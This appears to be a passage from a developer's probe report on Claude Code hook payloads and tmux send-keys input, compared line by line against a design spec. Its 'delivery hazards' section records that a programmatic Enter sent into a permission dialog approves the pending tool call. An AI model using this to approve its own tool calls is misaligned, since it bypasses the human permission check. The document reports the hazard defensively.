{"_event":"Notification","_captured_at":"2026-09-14T15:51:17.976Z","_epoch":1789401077.976117,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042144,"_claude_pid":4041880,"_ancestry":[...],"payload":{"session_id":"71757dd1-5375-4801-b467-7898a0bc1194","transcript_path":"/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194.jsonl","cwd":"/tmp/shp-tui-A-4tvrx00n","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194/scratchpad","prompt_id":"43ccd20b-51ee-4656-913f-3b0c4479a046","hook_event_name":"Notification","message":"Claude is waiting for your input","notification_type":"idle_prompt"}}
{"_event":"Notification","_captured_at":"2026-09-14T15:51:31.548Z","_epoch":1789401091.548040,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042190,"_claude_pid":4041880,"_ancestry":[...],"payload":{"session_id":"71757dd1-5375-4801-b467-7898a0bc1194","transcript_path":"/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194.jsonl","cwd":"/tmp/shp-tui-A-4tvrx00n","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194/scratchpad","prompt_id":"23e44d08-6acd-4f45-b02c-a41d31833b17","hook_event_name":"Notification","message":"Claude needs your permission","notification_type":"permission_prompt"}}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `session_id` | string (uuid) | always | | |
| `transcript_path` | string | always | `/root/.claude/projects/<slug>/<session_id>.jsonl` | the file may not exist yet |
| `cwd` | string | always | | |
| `scratchpad_dir` | string | always | `/tmp/claude-0/<slug>/<session_id>/scratchpad` | not in spec |
| `prompt_id` | string (uuid) | always | the last turn's prompt id | |
| `hook_event_name` | string | always | `Notification` | |
| `message` | string | always | `Claude is waiting for your input`, `Claude needs your permission` | generic: names no tool |
| `notification_type` | string | always | `idle_prompt`, `permission_prompt` | |
| `permission_mode` | string | never observed | | |

**Variants and edge cases:**
- `idle_prompt`: 60.027 s after `Stop` (`04-idle-delay.txt`). A second one was seen in `supp2` 60 s after a later `Stop`.
- `permission_prompt`: 6.021 s after `PermissionRequest`, and only if still unanswered (see the parity block).
- The `message` for a permission never names the tool. `needs_you_reason` has to come from `PermissionRequest.tool_name`/`tool_input`.

**Spec alignment:**
- Spec lines 945–947 say the UI shows *"needs permission: Bash(git push)"*. This is a clarification, not a contradiction: the `Notification` payload carries no tool, so the tool text must come from `PermissionRequest.tool_name`/`tool_input` (spec line 883 already lists `PermissionRequest` as a `needs_you_reason` source). When the human answers within about 6 s, `PermissionRequest` is the only prompt event (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/hooks-a.jsonl` lines 12–13).
- Otherwise aligned for `notification_type` values `idle_prompt` and `permission_prompt`.

---

### PermissionRequest payload (TUI, waiting for a human)

- **Produced by:** Claude Code 2.1.270, interactive, `permission_mode: default`
- **Consumed by:** §8 lines 883, 937; §11 line 1684; M1, M3
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` step 4. Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/hooks-a.jsonl` line 12)
```json
{"_event":"PermissionRequest","_captured_at":"2026-09-14T15:51:25.526Z","_epoch":1789401085.526870,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042177,"_claude_pid":4041880,"_ancestry":[...],"payload":{"session_id":"71757dd1-5375-4801-b467-7898a0bc1194","transcript_path":"/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194.jsonl","cwd":"/tmp/shp-tui-A-4tvrx00n","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194/scratchpad","prompt_id":"23e44d08-6acd-4f45-b02c-a41d31833b17","permission_mode":"default","hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"touch perm-probe.txt","description":"Create an empty file named perm-probe.txt"},"permission_suggestions":[{"type":"addDirectories","directories":["/tmp/shp-tui-A-4tvrx00n"],"destination":"session"},{"type":"setMode","mode":"acceptEdits","destination":"session"}]}}
```
What the pane shows at the same moment (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/06-permission-dialog.txt`):
```text
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 Bash command

   touch perm-probe.txt
   Create an empty file named perm-probe.txt

 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and always allow access to /tmp/shp-tui-A-4tvrx00n from this project
   3. No

 Esc to cancel · Tab to amend
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `session_id`, `transcript_path`, `cwd`, `scratchpad_dir` | string | always | | |
| `prompt_id` | string | always | same as the turn's `UserPromptSubmit` | the only join key back to the turn |
| `permission_mode` | string | always | `default` | |
| `hook_event_name` | string | always | `PermissionRequest` | |
| `tool_name` | string | always | `Bash` | |
| `tool_input` | object | always | `{"command","description"}` | |
| `permission_suggestions` | array | always | `[{type:addDirectories,...},{type:setMode,mode:acceptEdits,...}]` | |
| `tool_use_id` | string | **never observed** | | present on the preceding `PreToolUse` (line 11) |

**Variants and edge cases:**
- The sidecar changes to `"status":"waiting","waitingFor":"permission prompt"` 14 ms after the hook (`06-sidecar-permission.json`).
- The default dialog option is `1. Yes`, so a bare Enter approves the call (see the send-keys block).
- Headless `-p`: the same event fires, then the call is auto-denied (`docs/probes/2026-09-14-schemas/tmux-tui/headless-20260914T160308Z/h2_permission_default_mode.stdout.json`, key `permission_denials`).

**Spec alignment:**
- Aligned that the event fires while waiting.
- Mismatch with the "unresolved `PermissionRequest`" rule (line 937): the payload has no `tool_use_id`, and nothing marks resolution (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/hooks-a.jsonl` lines 11–14).

---

### SessionEnd payload (TUI: /exit, tmux kill-session, SIGTERM)

- **Produced by:** Claude Code 2.1.270, interactive
- **Consumed by:** §8 lines 887, 938, 964–970; M2 stop reasons; M3 kill/interrupt
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` steps 11–13. Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py`
- **Status:** partially verified. Reasons `prompt_input_exit` and `other` were verified live 2026-09-14; `clear`, `logout` and `resume` (spec lines 968–970) were not exercised.

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/hooks-a.jsonl` lines 34, 36, 37)
```json
{"_event":"SessionEnd","_captured_at":"2026-09-14T15:53:21.156Z","_epoch":1789401201.156579,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042522,"_claude_pid":4042432,"_ancestry":[...],"payload":{"session_id":"c3f63742-5ff5-44ea-8f6e-a26d027b51d0","transcript_path":"/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/c3f63742-5ff5-44ea-8f6e-a26d027b51d0.jsonl","cwd":"/tmp/shp-tui-A-4tvrx00n","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-A-4tvrx00n/c3f63742-5ff5-44ea-8f6e-a26d027b51d0/scratchpad","prompt_id":"2884fd06-a58c-4a40-bfbb-2e559736414e","hook_event_name":"SessionEnd","reason":"prompt_input_exit"}}
{"_event":"SessionEnd","_captured_at":"2026-09-14T15:53:28.700Z","_epoch":1789401208.700236,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042593,"_claude_pid":4042531,"_ancestry":[...],"payload":{"session_id":"f69f6919-4b86-4372-bf8e-41b85c596df0","transcript_path":"/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/f69f6919-4b86-4372-bf8e-41b85c596df0.jsonl","cwd":"/tmp/shp-tui-A-4tvrx00n","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-A-4tvrx00n/f69f6919-4b86-4372-bf8e-41b85c596df0/scratchpad","hook_event_name":"SessionEnd","reason":"other"}}
{"_event":"SessionEnd","_captured_at":"2026-09-14T15:53:33.685Z","_epoch":1789401213.685183,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042606,"_claude_pid":4041880,"_ancestry":[...],"payload":{"session_id":"71757dd1-5375-4801-b467-7898a0bc1194","transcript_path":"/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194.jsonl","cwd":"/tmp/shp-tui-A-4tvrx00n","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194/scratchpad","prompt_id":"aa1fe35d-e55e-48fa-a1d2-1702b97e46c7","hook_event_name":"SessionEnd","reason":"other"}}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `session_id`, `transcript_path`, `cwd`, `scratchpad_dir` | string | always | | |
| `prompt_id` | string | sometimes (3/4) | | absent when no prompt was ever sent (SIGTERM right after launch) |
| `hook_event_name` | string | always | `SessionEnd` | |
| `reason` | string | always | `prompt_input_exit` (/exit), `other` (kill-session, SIGTERM; also every `-p` exit) | |
| `end_reason` | | never observed | | |

**Variants and edge cases:**
- `/exit`: pane dead with status 0. The pane then prints `Resume this session with:` / `claude --resume "<title>"` (`13-dead-pane.txt`). The sidecar file is removed (`13-fork-sidecar-after-exit.json`: absent).
- `kill-session`: the hook ran 24 ms after the kill command, even though the pty was gone. The claude pid and sidecar were gone within 6 s (`15-pid-after-kill.txt`).
- SIGTERM: `SessionEnd{other}`, then `pane_dead_status` 143 and an empty `pane_dead_signal` (`14-list-sessions-after-sigterm.txt`).
- The capture script is fork-free bash. A slower hook (python) was not tried here, so whether a slow `SessionEnd` hook survives `kill-session` is **not verified**.

**Spec alignment:**
- Spec lines 967–970 say `SessionEnd.end_reason`; reality is `reason`.
- `other` (kill, signal, `-p` exit) has no stop-reason row. Evidence: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/field-matrix-a-and-supp.txt`, `15-hooks-after-kill.txt`.

---

### SessionStart payload (TUI: startup, compact, fork, named spawn)

- **Produced by:** Claude Code 2.1.270, interactive
- **Consumed by:** §8 lines 881, 925–927; §9 `ask()` lines 1203–1205 (D13); §7 `engine_session_id` (line 652); §7.1 title (D29); M1, M3
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` (steps 1, 9, 10) and `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui_supp.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui_supp.py`
- **Status:** partially verified. Sources `startup`, `compact` and `fork` were verified live 2026-09-14 in the TUI; `resume` was seen only headless, and `clear` was not seen at all.

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/hooks-a.jsonl` lines 1, 28, 30; `docs/probes/2026-09-14-schemas/tmux-tui/supp-20260914T155346Z/hooks-s.jsonl` line 1)
```json
{"_event":"SessionStart","_captured_at":"2026-09-14T15:50:12.998Z","_epoch":1789401012.998584,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4041990,"_claude_pid":4041880,"_ancestry":[...],"payload":{"session_id":"71757dd1-5375-4801-b467-7898a0bc1194","transcript_path":"/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194.jsonl","cwd":"/tmp/shp-tui-A-4tvrx00n","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194/scratchpad","hook_event_name":"SessionStart","source":"startup","model":"claude-haiku-4-5-20251001"}}
{"_event":"SessionStart","_captured_at":"2026-09-14T15:53:06.512Z","_epoch":1789401186.512250,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042420,"_claude_pid":4041880,"_ancestry":[...],"payload":{"session_id":"71757dd1-5375-4801-b467-7898a0bc1194","transcript_path":"/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194.jsonl","cwd":"/tmp/shp-tui-A-4tvrx00n","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194/scratchpad","prompt_id":"aa1fe35d-e55e-48fa-a1d2-1702b97e46c7","hook_event_name":"SessionStart","source":"compact","model":"claude-haiku-4-5-20251001","session_title":"shp-probe-title-1"}}
{"_event":"SessionStart","_captured_at":"2026-09-14T15:53:10.960Z","_epoch":1789401190.960490,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042467,"_claude_pid":4042432,"_ancestry":[...],"payload":{"session_id":"c3f63742-5ff5-44ea-8f6e-a26d027b51d0","transcript_path":"/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/c3f63742-5ff5-44ea-8f6e-a26d027b51d0.jsonl","cwd":"/tmp/shp-tui-A-4tvrx00n","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-A-4tvrx00n/c3f63742-5ff5-44ea-8f6e-a26d027b51d0/scratchpad","hook_event_name":"SessionStart","source":"fork","session_title":"shp-probe-title-1","seconds_since_last_response":77,"context_tokens":2353,"prompt_cache_likely_expired":true,"estimated_cache_write_usd":0.0047}}
{"_event":"SessionStart","_captured_at":"2026-09-14T15:53:54.011Z","_epoch":1789401234.011437,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042688,"_claude_pid":4042647,"_ancestry":[...],"payload":{"session_id":"17b1da21-4505-43ae-8958-35764a620384","transcript_path":"/root/.claude/projects/-tmp-shp-tui-S-0omgx4oc/17b1da21-4505-43ae-8958-35764a620384.jsonl","cwd":"/tmp/shp-tui-S-0omgx4oc","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-S-0omgx4oc/17b1da21-4505-43ae-8958-35764a620384/scratchpad","hook_event_name":"SessionStart","source":"startup","model":"claude-haiku-4-5-20251001","session_title":"shp-spawn-name"}}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `session_id` | string | always | with `--session-id <uuid>` it equals the requested uuid (`supp-.../02-sessionstart-and-sidecar.txt`) | lets the runner know `engine_session_id` before spawn |
| `transcript_path` | string | always | | the file does **not** exist yet at startup or fork; it is created on the first prompt |
| `cwd`, `scratchpad_dir` | string | always | | |
| `hook_event_name` | string | always | `SessionStart` | |
| `source` | string | always | `startup`, `compact`, `fork` (TUI); `resume` (headless) | |
| `model` | string | sometimes (4/5) | `claude-haiku-4-5-20251001` | absent on `fork` |
| `prompt_id` | string | sometimes (1/5) | | only on `compact` |
| `session_title` | string | sometimes (3/5) | `shp-probe-title-1`, `shp-spawn-name` | present once a user title exists (`/rename`, `--name`, or inherited by a fork) |
| `seconds_since_last_response`, `context_tokens`, `prompt_cache_likely_expired`, `estimated_cache_write_usd` | int/int/bool/float | sometimes (1/5) | `77`, `2353`, `true`, `0.0047` | fork only |
| `permission_mode` | | never observed | | |
| `start_reason` | | never observed | | |

**Variants and edge cases:**
- When the original had a user title, the fork inherited it (`hooks-a.jsonl` line 30). Every fork in the captures (TUI and headless h5) was of a session that already had a user title, so a fork of an untitled session was not observed.
- `SessionStart{compact}` keeps the same `session_id`.

**Spec alignment:**
- Spec line 1204–1205 says "the `SessionStart` hook's `start_reason` enum includes `fork`". The field is `source`, value `fork` (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/hooks-a.jsonl` line 30).
- Spec line 652 says `engine_session_id` is "Null until the engine emits it". This is an opportunity, not a contradiction: the rule stays correct for `attached` sessions, but for owned TUI spawns `--session-id <uuid>` makes the id known before the process starts, and `SessionStart` echoes it (`docs/probes/2026-09-14-schemas/tmux-tui/supp-20260914T155346Z/02-sessionstart-and-sidecar.txt`). The transcript file does not exist until the first prompt.

---

### PreCompact / PostCompact payload (manual /compact typed into the TUI)

- **Produced by:** Claude Code 2.1.270, interactive
- **Consumed by:** §8 line 921 (context), line 966 (`context_exhausted`); M2
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` step 9. Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py`
- **Status:** partially verified. `trigger: manual` was verified live 2026-09-14; `trigger: auto` and the `context_exhausted` case were not provoked.

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/hooks-a.jsonl` lines 26, 29)
```json
{"_event":"PreCompact","_captured_at":"2026-09-14T15:52:51.987Z","_epoch":1789401171.987317,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042393,"_claude_pid":4041880,"_ancestry":[...],"payload":{"session_id":"71757dd1-5375-4801-b467-7898a0bc1194","transcript_path":"/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194.jsonl","cwd":"/tmp/shp-tui-A-4tvrx00n","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194/scratchpad","prompt_id":"aa1fe35d-e55e-48fa-a1d2-1702b97e46c7","hook_event_name":"PreCompact","trigger":"manual","custom_instructions":null}}
{"_event":"PostCompact","_captured_at":"2026-09-14T15:53:06.523Z","_epoch":1789401186.523713,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042422,"_claude_pid":4041880,"_ancestry":[...],"payload":{"session_id":"71757dd1-5375-4801-b467-7898a0bc1194","transcript_path":"/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194.jsonl","cwd":"/tmp/shp-tui-A-4tvrx00n","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194/scratchpad","prompt_id":"aa1fe35d-e55e-48fa-a1d2-1702b97e46c7","hook_event_name":"PostCompact","trigger":"manual","compact_summary":"<analysis>\nThis conversation is relatively brief and consists primarily of testing interactions. Let me analyze chronologically:\n\n1...
```
Order (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/11-compact-hook-order.txt`):
```text
2026-09-14T15:52:51.987Z PreCompact manual
2026-09-14T15:53:06.477Z SubagentStop 
2026-09-14T15:53:06.512Z SessionStart compact
2026-09-14T15:53:06.523Z PostCompact manual
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `trigger` | string | always | `manual` | |
| `custom_instructions` | null | always (PreCompact) | `null` | |
| `compact_summary` | string | always (PostCompact) | 4168 chars, starts `<analysis>` | model-written; treat as untrusted content |
| `prompt_id` | string | always | | |
| `permission_mode` | | never observed | | |

**Variants and edge cases:**
- The transcript gains a `system/compact_boundary` entry with `compactMetadata.trigger`, `preTokens`, `postTokens` and `durationMs` (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/07-10-11-transcript-excerpt.jsonl`, last line).
- Not verified: `trigger: auto`, and `PreCompact{auto}` without `PostCompact`. That would need a context-filling session.

**Spec alignment:** aligned for the manual path (the event pair exists and fires in the TUI). `context_exhausted` (line 966) is not verified.

---

### UserPromptSubmit from tmux send-keys

- **Produced by:** Claude Code 2.1.270, interactive, input delivered by `tmux -L shepherd-probe send-keys -t =<name>: -l '<text>'` then `send-keys ... Enter`
- **Consumed by:** §8 line 882 (`brief`); §9 write policy lines 1163–1177; mailbox lines 1179–1185 (D12); M3
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` steps 2, 3b, 5; `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui_supp3.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/hooks-a.jsonl` lines 7, 19, 20; `docs/probes/2026-09-14-schemas/tmux-tui/supp-20260914T155346Z/hooks-s.jsonl` line 2)
```json
{"_event":"UserPromptSubmit","_captured_at":"2026-09-14T15:51:20.122Z","_epoch":1789401080.122869,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042157,"_claude_pid":4041880,"_ancestry":[...],"payload":{"session_id":"71757dd1-5375-4801-b467-7898a0bc1194","transcript_path":"/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194.jsonl","cwd":"/tmp/shp-tui-A-4tvrx00n","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194/scratchpad","prompt_id":"b3fa1c2b-04f9-4a7e-9927-79bd34c8a4b1","permission_mode":"default","hook_event_name":"UserPromptSubmit","prompt":"Reply with only the word MULTI.\n- note one\n- note two"}}
{"_event":"PreToolUse","_captured_at":"2026-09-14T15:51:38.746Z","_epoch":1789401098.746586,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042249,"_claude_pid":4041880,"_ancestry":[...],"payload":{"session_id":"71757dd1-5375-4801-b467-7898a0bc1194","transcript_path":"/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194.jsonl","cwd":"/tmp/shp-tui-A-4tvrx00n","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194/scratchp...
{"_event":"UserPromptSubmit","_captured_at":"2026-09-14T15:51:41.247Z","_epoch":1789401101.247491,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042263,"_claude_pid":4041880,"_ancestry":[...],"payload":{"session_id":"71757dd1-5375-4801-b467-7898a0bc1194","transcript_path":"/root/.claude/projects/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194.jsonl","cwd":"/tmp/shp-tui-A-4tvrx00n","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-A-4tvrx00n/71757dd1-5375-4801-b467-7898a0bc1194/scratchpad","prompt_id":"5c97d8c9-95d1-4808-90ae-756cfa656845","permission_mode":"default","hook_event_name":"UserPromptSubmit","prompt":"Reply with only the word SECOND"}}
{"_event":"UserPromptSubmit","_captured_at":"2026-09-14T15:53:57.591Z","_epoch":1789401237.591180,"_claude_version":"2.1.270 (Claude Code)","_hook_pid":4042744,"_claude_pid":4042647,"_ancestry":[...],"payload":{"session_id":"17b1da21-4505-43ae-8958-35764a620384","transcript_path":"/root/.claude/projects/-tmp-shp-tui-S-0omgx4oc/17b1da21-4505-43ae-8958-35764a620384.jsonl","cwd":"/tmp/shp-tui-S-0omgx4oc","scratchpad_dir":"/tmp/claude-0/-tmp-shp-tui-S-0omgx4oc/17b1da21-4505-43ae-8958-35764a620384/scratchpad","prompt_id":"6f5b7ddd-b2b9-43da-a9ec-1905b3d64d82","permission_mode":"default","hook_event_name":"UserPromptSubmit","prompt":"Print the integers from 1 to 80, one per line, nothing else.","session_title":"shp-spawn-name"}}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `prompt` | string | always | exactly the `send-keys -l` text; newlines kept as `\n` | a multi-line message is one prompt |
| `prompt_id` | string | always | a new id per idle-prompt submit; the **running turn's id** for a mid-turn submit | lines 18–20 share `5c97d8c9-...` |
| `permission_mode` | string | always | `default` | |
| `session_title` | string | sometimes (2/7) | `shp-probe-title-1`, `shp-spawn-name` | present when a user title exists |
| `source` | string | never observed | | |

**Variants and edge cases:**
- **Multi-line:** `send-keys -l "…\n- note one\n- note two"` did not submit early. All three lines sat in the input box until Enter (`05-multiline-typed.txt`, `05-multiline-hooks-before-enter.txt` = `[]`).
- **Mid-turn:** text sent while a tool ran made the pane show the queued text plus `❯ Press up to edit queued messages` (`07-running-after-send.txt`). `UserPromptSubmit` fired within 41 ms. The message was absorbed into the running turn at the next tool result: the model never produced `DONE-ONE`, answered `SECOND`, and there was one `Stop` (`07-stop-count.txt`).
- **Ghost text:** typing over a prompt-suggestion ghost replaced it. The submitted prompt was exactly the typed text (`docs/probes/2026-09-14-schemas/tmux-tui/supp3-20260914T160052Z/A3-hooks-after-enter.json`).

**Spec alignment:**
- Spec line 115 (D12 reasoning) says "Direct injection into a running session corrupts its state". In reality Claude Code has its own input queue: a mid-turn write is enqueued, then `absorbed_mid_turn` into the running turn. The running turn's instructions are silently merged with the new message, and there is no separate `Stop` per message. The mailbox design (line 1169, deliver at next `Stop`) stays correct; the stated failure mode is different from what happens (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/07-10-11-transcript-excerpt.jsonl`, `07-stop-count.txt`).
- Spec line 882 (`brief` from `UserPromptSubmit`): aligned. Note that a mid-turn message also arrives as `UserPromptSubmit`, so "first `UserPromptSubmit`" is the only safe brief.

---

### tmux send-keys delivery hazards (programmatic write path)

- **Produced by:** tmux 3.4 `send-keys` into Claude Code 2.1.270 TUI screens
- **Consumed by:** §9 write policy table lines 1165–1169; §9.5 `send_to_session` line 1229; D12, D40; M3
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui_supp2.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui_supp2.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/supp2-20260914T155625Z/B2-after-typing-into-dialog.txt`, after `send-keys -l "Reply with only the word NOPE"` into a permission dialog)
```text
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 Bash command

   touch dialog-probe.txt
   Create an empty file named dialog-probe.txt

 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and always allow access to /tmp/shp-tui-X-7r0510pt from this project
   3. No

 Esc to cancel · Tab to amend
```
Then `send-keys Enter` (`docs/probes/2026-09-14-schemas/tmux-tui/supp2-20260914T155625Z/B-hooks.json`, `B-file-created.txt`):
```text
...
 [
  "2026-09-14T15:58:46.058Z",
  "PreToolUse",
  "Bash"
 ],
 [
  "2026-09-14T15:58:46.113Z",
  "PermissionRequest",
  "Bash"
 ],
 [
  "2026-09-14T15:58:48.537Z",
  "PostToolUse",
  "Bash"
 ],
 [
  "2026-09-14T15:58:48.550Z",
  "PostToolBatch",
  null
 ],
 [
  "2026-09-14T15:58:51.174Z",
  "MessageDisplay",
  null
 ],
...
dialog-probe.txt exists: True
```
Prompt-suggestion ghost text (`docs/probes/2026-09-14-schemas/tmux-tui/supp2-20260914T155625Z/A1-suggestion.txt` and `.ansi.cat-v.txt`):
```text
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ cat hello.txt
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
^[[39mM-bM-^]M-/M-BM- ^[[2mcat hello.txt^[[0m
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| typed text at a permission dialog | keystrokes | always | discarded; not echoed, no hook | |
| Enter at a permission dialog | keystroke | always | selects the highlighted option, which defaults to `1. Yes` | the tool ran and the file was created |
| ghost suggestion | pane text | sometimes (1–4 turns in) | `cat hello.txt`, `edit notes.txt` | in `-p` output indistinguishable from typed input; in `-e` output wrapped in SGR `2` (dim) … `0` |
| bare Enter on a ghost suggestion | keystroke | observed once | nothing submitted (no hook within 8 s), ghost stays (`A2-after-bare-enter.txt`, `A2-hooks-after-bare-enter.json` = `[]`) | |
| typed text over a ghost | keystrokes | observed once | replaces the ghost; submitted verbatim | `docs/probes/2026-09-14-schemas/tmux-tui/supp3-*/A3-hooks-after-enter.json` |

**Variants and edge cases:**
- Not verified: text beginning with a digit (`1`/`2`/`3`) at a permission dialog, which presumably selects an option directly; `Esc`; `Tab to amend`.
- A pane-scraper that reads the input box with plain `capture-pane -p` will mistake ghost text for a draft. It must use `-e` and check for SGR 2.

**Spec alignment:**
- Spec line 1168 says "`needs_you` | write immediately (it is *asking* you)". When `needs_you` comes from a permission prompt, a programmatic message plus Enter is **not delivered and approves the pending tool call**. A write in this state must be refused or routed as an explicit answer, never as text (`docs/probes/2026-09-14-schemas/tmux-tui/supp2-20260914T155625Z/B-hooks.json`, `B-file-created.txt`).

---

### Transcript entries written by TUI input: queue-operation, queued_command, compact_boundary

- **Produced by:** Claude Code 2.1.270, interactive (transcript `~/.claude/projects/<slug>/<session_id>.jsonl`)
- **Consumed by:** §9 mailbox (D12); §8 transcript tail classifier (D24); M2, M3
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` steps 5, 8, 9 (lines copied by grep into the evidence file). Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/07-10-11-transcript-excerpt.jsonl`)
```json
{"type":"queue-operation","operation":"enqueue","timestamp":"2026-09-14T15:51:41.227Z","sessionId":"71757dd1-5375-4801-b467-7898a0bc1194","content":"Reply with only the word SECOND"}
{"type":"queue-operation","operation":"remove","timestamp":"2026-09-14T15:51:50.854Z","sessionId":"71757dd1-5375-4801-b467-7898a0bc1194","content":"Reply with only the word SECOND","reason":"absorbed_mid_turn"}
